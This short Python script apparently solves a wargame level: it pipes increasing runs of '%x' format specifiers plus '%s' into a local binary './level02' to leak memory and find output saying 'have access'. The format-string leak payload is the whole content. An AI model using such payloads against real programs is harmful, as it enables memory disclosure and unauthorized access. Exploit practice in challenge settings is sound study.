import subprocess

for i in range(50):
        p = subprocess.Popen('(python -c "print(\'%x\' * {} + \' %s\')" ; echo bite) | ./level02'.format(i), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in p.stdout.readlines():
                if 'have access' in line:
                        print(line)
